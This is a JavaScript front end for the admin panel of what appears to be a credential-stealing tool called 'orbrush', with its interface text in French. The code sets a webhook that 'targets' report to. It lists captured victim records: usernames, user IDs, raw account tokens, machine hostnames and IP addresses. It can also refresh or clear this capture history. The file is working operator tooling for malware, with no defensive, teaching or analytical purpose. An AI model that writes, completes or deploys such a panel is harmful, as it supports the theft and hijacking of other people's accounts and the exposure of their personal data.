'use strict';

const $ = (id) => document.getElementById(id);

let key = localStorage.getItem('orbrush-key') || '';

function toast(message, kind) {
  const node = document.createElement('div');
  node.className = 'toast' + (kind ? ' ' + kind : '');
  node.textContent = message;
  $('toasts').appendChild(node);
  requestAnimationFrame(() => node.classList.add('show'));
  setTimeout(() => {
    node.classList.remove('show');
    setTimeout(() => node.remove(), 320);
  }, 3400);
}

async function api(pathname, options) {
  const opts = Object.assign({}, options || {});
  const headers = Object.assign({}, opts.headers || {});
  if (key) headers['x-admin-key'] = key;
  if (opts.body) headers['Content-Type'] = 'application/json';
  const res = await fetch(pathname, Object.assign({}, opts, { headers }));
  let data = {};
  try {
    data = await res.json();
  } catch (_) {
    data = {};
  }
  if (!res.ok) throw new Error(data.error || 'HTTP ' + res.status);
  return data;
}

function setPill(id, text, kind) {
  const node = $(id);
  node.textContent = text;
  node.className = 'pill' + (kind ? ' ' + kind : '');
}

function fmtDate(value) {
  if (!value) return '';
  const d = new Date(value);
  if (Number.isNaN(d.getTime())) return '';
  return d.toLocaleString('fr-FR');
}

async function checkHealth() {
  try {
    const res = await fetch('/api/health');
    if (!res.ok) throw new Error('ko');
    setPill('health', 'en ligne', 'ok');
  } catch (_) {
    setPill('health', 'hors ligne', 'err');
  }
}

async function validateKey(silent) {
  if (!key) {
    setPill('key-state', 'non definie', 'err');
    return false;
  }
  try {
    const res = await api('/api/check');
    if (res.ok) {
      setPill('key-state', 'valide', 'ok');
      if (!silent) toast('Cle valide', 'ok');
      return true;
    }
    setPill('key-state', 'invalide', 'err');
    return false;
  } catch (_) {
    setPill('key-state', 'erreur', 'err');
    return false;
  }
}

async function saveKey() {
  key = $('key').value.trim();
  localStorage.setItem('orbrush-key', key);
  const ok = await validateKey(false);
  if (ok) {
    await loadConfig();
    await loadCaptures();
  }
}

async function loadConfig() {
  try {
    const res = await fetch('/api/config');
    const data = await res.json();
    $('webhook').value = data.webhook || '';
    if (data.webhook) {
      setPill('cfg-state', 'configure', 'ok');
      $('cfg-updated').textContent = data.updatedAt ? 'Modifie le ' + fmtDate(data.updatedAt) : '';
    } else {
      setPill('cfg-state', 'vide', 'err');
      $('cfg-updated').textContent = 'Aucun webhook : les cibles ne recevront rien.';
    }
  } catch (_) {
    setPill('cfg-state', 'erreur', 'err');
  }
}

async function saveWebhook() {
  if (!(await validateKey(true))) {
    toast('Renseigne une cle admin valide', 'err');
    return;
  }
  try {
    await api('/api/config', {
      method: 'POST',
      body: JSON.stringify({ webhook: $('webhook').value.trim() })
    });
    toast('Webhook enregistre', 'ok');
    await loadConfig();
  } catch (e) {
    toast(String(e.message || e), 'err');
  }
}

async function testWebhook() {
  if (!(await validateKey(true))) {
    toast('Renseigne une cle admin valide', 'err');
    return;
  }
  try {
    await api('/api/test', {
      method: 'POST',
      body: JSON.stringify({ webhook: $('webhook').value.trim() })
    });
    toast('Message de test envoye', 'ok');
  } catch (e) {
    toast(String(e.message || e), 'err');
  }
}

function renderCaptures(list) {
  const box = $('captures');
  box.innerHTML = '';
  if (!list.length) {
    const empty = document.createElement('div');
    empty.className = 'empty';
    empty.textContent = 'Aucune capture pour le moment.';
    box.appendChild(empty);
    return;
  }
  list.forEach((item) => {
    const card = document.createElement('div');
    card.className = 'capture';

    const line1 = document.createElement('div');
    line1.className = 'line1';
    const who = document.createElement('span');
    who.className = 'who';
    who.textContent = (item.user && (item.user.global_name || item.user.username)) || 'Utilisateur inconnu';
    const when = document.createElement('span');
    when.className = 'when';
    when.textContent = fmtDate(item.at);
    line1.appendChild(who);
    line1.appendChild(when);

    const tok = document.createElement('div');
    tok.className = 'tok';
    tok.textContent = item.token || '';

    const meta = document.createElement('div');
    meta.className = 'meta';
    const bits = [];
    if (item.user && item.user.id) bits.push('ID ' + item.user.id);
    if (item.source) bits.push(item.source);
    if (item.machine && item.machine.hostname) bits.push(item.machine.hostname);
    if (item.ip) bits.push(item.ip);
    meta.textContent = bits.join(' - ');

    card.appendChild(line1);
    card.appendChild(tok);
    card.appendChild(meta);
    box.appendChild(card);
  });
}

async function loadCaptures() {
  if (!(await validateKey(true))) return;
  try {
    const res = await api('/api/captures');
    renderCaptures(res.captures || []);
  } catch (_) {
    renderCaptures([]);
  }
}

async function clearCaptures() {
  if (!(await validateKey(true))) return;
  try {
    await api('/api/captures', { method: 'DELETE' });
    renderCaptures([]);
    toast('Historique vide', 'ok');
  } catch (e) {
    toast(String(e.message || e), 'err');
  }
}

function init() {
  $('key').value = key;
  $('save-key').addEventListener('click', saveKey);
  $('save-webhook').addEventListener('click', saveWebhook);
  $('test-webhook').addEventListener('click', testWebhook);
  $('refresh').addEventListener('click', loadCaptures);
  $('clear').addEventListener('click', clearCaptures);
  $('key').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') saveKey();
  });

  checkHealth();
  loadConfig();

  if (key) {
    validateKey(true).then((ok) => {
      if (ok) loadCaptures();
    });
  } else {
    setPill('key-state', 'non definie', 'err');
  }

  setInterval(checkHealth, 60000);
}

init();
